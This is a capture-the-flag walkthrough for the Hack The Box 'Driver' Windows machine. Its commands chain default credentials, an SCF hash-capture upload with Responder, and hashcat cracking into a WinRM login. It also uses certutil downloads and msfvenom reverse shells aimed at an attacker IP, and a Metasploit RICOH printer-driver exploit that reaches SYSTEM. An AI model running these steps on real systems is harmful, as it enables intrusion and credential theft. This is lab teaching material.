# Driver - Easy

```sh
sudo vim /etc/hosts
# add driver.htb

nmap -T4 -p- -A -Pn -v driver.htb
```

* open ports & services:

    * 80/tcp - http - Microsoft IIS httpd 10.0
    * 135/tcp - msrpc - Microsoft Windows RPC
    * 445/tcp - microsoft-ds - Microsoft Windows 7 - 10 microsoft-ds
    * 5985/tcp - http - Microsoft HTTPAPI httpd 2.0

* ```nmap``` scan results show that the webpage on port 80 is using basic HTTP auth, and it also discloses the username 'admin' via the message "Basic realm=MFP Firmware Update Center. Please enter password for admin"

* the webpage prompts us with the basic auth pop-up before we are able to access it

* if we use default creds "admin:admin", it works and we are able to access the website

* the website is for "MFP Firmware Update Center", and is for multi-functional printers; the website footer discloses the email 'support@driver.htb'

* the navigation bar links to a page for 'Firmware Updates' at '/fw_up.php'

* this page has a form where we can select a printer model from dropdown, and upload firmware file - the page also mentions "Our testing team will review the uploads manually and initiates the testing soon", which means the uploaded files will be checked by someone

* the dropdown provides 4 printer models - HTB DesignJet, HTB Ecotank, HTB Laserjet Pro, and HTB Mono

* we can try to abuse this for malicious file upload - we can intercept an upload request in Burp Suite and inspect it

* if we upload a random file like a PHP reverse shell, the upload goes through, and we get a positive response as the page redirects to '/fw_up.php?msg=SUCCESS'

* we can confirm that there are no checks on file uploads, so we can abuse this to get RCE via two ways:

    * if the file is uploaded to a directory on the website, we can navigate to that directory and trigger the webshell
    * if the file is manually checked by someone from the firmware testing team, we can upload a malicious file that gives RCE when executed

* we can attempt the latter method first, as the webpage mentions the uploads would be manually reviewed:

    ```sh
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f exe > firmware.exe
    # generate malicious EXE file

    nc -nvlp 4444
    # setup listener
    ```

* we can upload the malicious .exe payload and wait to check if the executable triggers the RCE

* even after waiting for several minutes, we do not get any connection attempts; trying this with other file formats also does not help, so we need to check another privesc vector

* enumerating SMB:

    ```sh
    smbclient -N -L //driver.htb
    # access denied

    smbclient -U admin -L //driver.htb
    # this does not work

    smbmap -H driver.htb
    # auth error
    ```

* as the machine has the SMB service running, it is possible that this share is linked with the firmware file uploads from the webpage

* in such cases, we can attempt [uploading SCF (shell command file) files such that whenever someone accesses it on a fileshare, we can fetch their hashes](https://github.com/SrivathsanNayak/ethical-hacking-notes/blob/main/HTBAcademy/WindowsPrivesc/README.md#additional-techniques):

    ```sh
    vim firmware.scf
    # create SCF file
    # it should link to the attacker IP
    ```

    ```sh
    [Shell]
    Command=2
    IconFile=\\10.10.14.9\share\legit.ico
    [Taskbar]
    Command=ToggleDesktop
    ```

    ```sh
    sudo responder -I tun0
    # start responder
    ```

* once the SCF file is created, with the icon file pointing to an UNC path linked to our IP, we can upload the SCF file in the firmware update form

* as soon as the file is uploaded, ```responder``` is able to capture NTLMv2 hashes for user 'tony'

* we can crack the hash using ```hashcat```:

    ```sh
    vim tonyhash
    # paste complete hash

    hashcat -m 5600 tonyhash /usr/share/wordlists/rockyou.txt
    # mode 5600 for NTLMv2
    ```

* ```hashcat``` cracks the hash to give us the cleartext "liltony"

* as port 5985 is open on the box, we can try to login via ```evil-winrm```:

    ```sh
    evil-winrm -u tony -p liltony -i driver.htb
    # this works

    cd C:\Users\tony

    ls

    type Desktop\user.txt
    # user flag

    # we can use winpeas for enum - fetch exe from attacker
    certutil.exe -urlcache -f http://10.10.14.9:8000/winPEASx64.exe winpeas.exe

    .\winpeas.exe
    ```

* findings from ```winpeas```:

    * no AV detected
    * PS history file found at ```C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt```
    * scheduled app named 'VerifyFirmware' detected at ```C:\Users\tony\appdata\local\job\job.bat```, and 'tony' has 'AllAccess' rights

* ```winpeas``` shows a non-default scheduled task - we can check it further:

    ```ps
    schtasks /query /tn "VerifyFirmware" /fo LIST /v
    ```

* this task is authored by 'Administrator', but run as user 'tony' and trigger is user logon - we can check the batch script now:

    ```ps
    dir C:\Users\tony\appdata\local\job
    # there is a .bat and a .ps1 file

    type C:\Users\tony\appdata\local\job\job.bat

    type C:\Users\tony\appdata\local\job\quit.ps1
    ```

* the batch script runs the PS script, which checks and opens the ```C:\firmwares``` folder - this is very likely the automation for the driver update script

* checking the PS history file found:

    ```ps
    type C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    ```

* the PS history file includes the command ```Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'```

* this means a printer has been added with a specific driver

* Googling for "RICOH PCL6 UniversalDriver V4.23" gives [multiple results for CVE-2019-19363](https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)

* we can verify if the printer is added:

    ```ps
    Get-Printer
    # does not work

    wmic printer list brief
    # access denied

    Get-WMIObject -Class Win32_Printer
    # access denied
    ```

* as we are unable to verify the printer list, we can attempt the exploit directly for this vulnerable printer driver version

* we can use the [metasploit exploit module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/local/ricoh_driver_privesc.md) for this - we need to get a session as 'tony' first:

    ```sh
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f exe -o shell.exe
    # generate payload for reverse shell

    msfconsole -q

    use exploit/multi/handler

    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST tun0
    set LPORT 4444
    
    run
    ```

    ```ps
    # on target, in winrm session

    certutil.exe -urlcache -f http://10.10.14.9:8000/shell.exe shell.exe
    # fetch the exe

    .\shell.exe
    ```

    ```sh
    # on running the malicious exe, we get the reverse shell session on meterpreter

    # in meterpreter

    ps
    # view processes

    # migrate to a stable process - without this the metasploit exploit does not work

    migrate 3220
    # migrate to a process like explorer.exe or OneDrive.exe

    background
    # background target session

    use ricoh_driver_privesc

    options

    set SESSION 1
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST tun0
    set LPORT 5555

    run
    # this works

    getuid
    # nt authority\system

    shell
    # launch shell

    type C:\Users\Administrator\Desktop\root.txt
    # root flag
    ```
